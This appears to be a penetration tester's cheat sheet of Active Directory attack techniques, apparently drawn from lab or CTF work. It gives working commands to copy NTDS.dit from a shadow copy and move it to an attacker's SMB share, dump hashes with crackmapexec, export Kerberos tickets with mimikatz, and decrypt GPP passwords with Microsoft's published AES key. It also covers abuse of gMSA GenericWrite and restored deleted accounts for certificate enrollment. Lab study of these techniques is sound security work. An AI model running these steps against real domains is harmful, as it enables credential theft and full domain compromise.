# AD Tips

% active diretory

## Manual dumping NTDS.DIT as a user in Admin group/DA group
```
# Check local group membership > Admin group ?
net localgroup

# Check user priv including Domain
net user <USERNAME>

# Shadow copy of C:i, note the Shado copy volume name
vssadmin CREATE SHADOW /For=C:

# Copy NTDS.DIT form the VSS
# example: cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
cmd.exe /c copy \\?\GLOBALROOT\Device\<..> c:\NTDS\NTDS.dit

# Create a SMB share on the attacker's machine

#  Transferring NTDS.dit to Attack Host
cmd.exe /c move C:\NTDS\NTDS.dit \\<ATK IP>\<SHARENAME>
```

## Dumping NTDS.DIT - netexec (uses VSS)
```
crackmapexec smb <IP> -u <USER> -p <PASSWD> --ntds
```

## Harvest kerberos tickets from windows
```
# Harvest kerberos tickets from windows

# From mimikatz
mimikatz # privilege::debug
sekurlsa::tickets /export

dir *.kirbi
```

## Bloodhound - Finding non-default/non-standard AD groups from injestor JSON output
```
# Bloodhound - Finding non-default/non-standard AD groups from injestor JSON output 
# Non-default AD groups have the last part of their domains SID > 1000
 cat 20250731161542_groups.json | jq '.data[]
        | select((.ObjectIdentifier | split("-") | last | tonumber) > 1000)
        | [.ObjectIdentifier, .Properties.name, .Properties.whencreated]'
# DNS Admin which SID > 1000 is a default group, ignore it
```

## Using NT:LM hash
```
# Prepend NT hashes with ':' !(Or use NT:LM hash in its entirety) Beware of authentication failures because of this
```

## Rubeus - TGT ticket harvesting when Admin on a DC that is a KDC
```
If you are Admin on a DC which plays the role of the KDC, you can
- dump the TGT already on memory using Rubeus & impersonate users
- monitor & harvest TGT on that DC
```

## Remarkable default settings for a DC
```
## Remarkable default settings for a DC
- SMB
  - SMB signing is enabled by default on Windows Server acting as DC
```

## SMB share - SYSVOL hunting passwd
```
## SMB share - SYSVOL hunting passwd


    To reach SYSVOL folder: run> %Logonserver%

    \\SYSVOL<DOMAIN>\Policies\

    Search for XML, VBS or Batch file that is used to change the password. This can be done by searching for the mentioned file types (with specific search keywords). The password reset script is to be found.

    *.xml , *.vbs , *.bat etc.

    Map drives (Drives.xml)

    Create Local Users (unattend.xml)

    Data Sources (DataSources.xml)

    Printer configuration (Printers.xml)

    Create/Update Services (Services.xml)

    Scheduled Tasks (ScheduledTasks.xml)

    Change local Administrator passwords

    Group policy preferences (Groups.xml)

These XML files can be searched in the SYSVOL folder using key word search. Passwords in the XML file can be searched using the key value “cpassword”. The encryption is 32-byte AES as per Microsoft’s documentation, the encryption key is:

4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8

f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b

AES KEY Source: https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx

With access to this XML file, the attacker can use the AES private key to decrypt the GPP password. The PowerSploit function Get-GPPPassword is most useful for Group Policy Preference exploitation.

https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
```

## Debug common error : KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```
## Debug KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
i.e SPN you’re requesting doesn’t exist or doesn’t match the target
Use FQDN to define the server principal

Kerberos expects server principals name (SPN) like : cifs/DC-JPQ225.foo.vl
- No SPN if you use IP
- check if you didn't use the wrong hostname/domain

1. Use FQDN, not IP
2. Ensure DNS resolution :
/etc/hosts:
10.129.17.112 DC-JPQ225.domain.internal DC-JPQ225
3. Force SPN / hostname if supported
4. Verify klist : klist
```


## Log Hygiene - useful points
```
# Log Hygiene - useful points

# Creds in log
- An ADCS-enabled, hardened Active Directory environment still fell to a plaintext password in a readable file share. Old IdentitySync traces that look harmless contain bind credentials.
```

## gMSA points
```
# gMSA points
- GenericWrite on a gMSA is equivalent to holding its password — you can grant yourself read access on msDS-GroupMSAMembership and dump the NT hash whenever you want.
```

## Bloodhound - Run systematically an Injestor after each compromission
```
# If the OPSEc allows it, run systematically the injestor after each user compromission.
```

## Bloodhound - Deleted user and dangling SID
```
# Bloodhound - Deleted user and dangling SID
SID may show in certipy output/enrollment rights :
S-XXXX is not resolved to a name. 
This typically indicates that the associated account has either been deleted, is orphaned, or cannot be resolved by the system at this time. 
This is significant because permissions tied to unresolved SIDs can remain active within Active Directory. If the corresponding object can be restored (for example, via the Active Directory Recycle Bin ) or otherwise re-associated, those privileges may become usable again. 
In this case, it suggests that a previously existing account may still retain enrollment rights to the certificate template , potentially opening the door to abuse. 
We check the Active Directory Recycle Bin for soft-deleted objects using PowerShell . The AD Recycle Bin preserves deleted objects in a recoverable state for a configurable tombstone period.

2 ways to see identiy missing SID for certs :
- BH > Enrollment rights on published certificate templates
- Certipy find ... > check the section "Enrollment Rights" > find a SID

Restore the deleted objects and use them to request certs !
```

## AD - Find and restore missing AD objects
```
# AD - Find and restore missing AD objects

# When an object is restored from the AD Recycle Bin : 
# 1. AD reads the object’s metadata (including lastKnownParent ). 
# 2. It attempts to recreate the object in that original container ( OU ). 
# 3. The object is effectively reinserted into that OU with its attributes.

# List all missing obj
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties cn,objectSid,isDeleted | Where- Object { $_.isDeleted -eq $true }

# We know that john has GenericAll over the XXX OU. Since restoring the object from the recycle bin eventually writes it back into the OU, and the john user has excessive privileges over that OU, it effectively means that john can restore the cert_admin user.

# Restore the user object
Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -IncludeDeletedObjects - Properties * # We note the GUID
Restore-ADObject -identity <GUID>

# Because <USER> holds GenericAll over the XXX OU, we can propagate an inherited FullControl ACE from the OU down to all its child objects — which now includes the restored cert_admin .
cf FullControl dacledit
```